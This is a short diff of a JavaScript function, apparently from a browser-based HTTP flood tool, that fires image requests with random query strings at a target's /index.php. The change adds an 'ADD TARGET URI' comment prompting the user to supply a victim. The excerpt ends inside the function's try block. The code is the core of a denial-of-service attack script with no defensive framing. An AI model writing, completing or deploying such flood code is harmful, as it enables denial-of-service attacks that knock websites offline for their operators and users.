@@ -1,7 +1,7 @@
 function floodImagesXYZ() {
-  var TARGET = "";
+  var TARGET = ""; //ADD TARGET URI
   var URI = "/index.php?";
-  var pic = new Image();
+  var pic = new Image(); 
   var rand = Math.floor(Math.random() * 10000000000000000000000);
   try {
     pic.src = "http://" + TARGET + URI + rand + "=val";
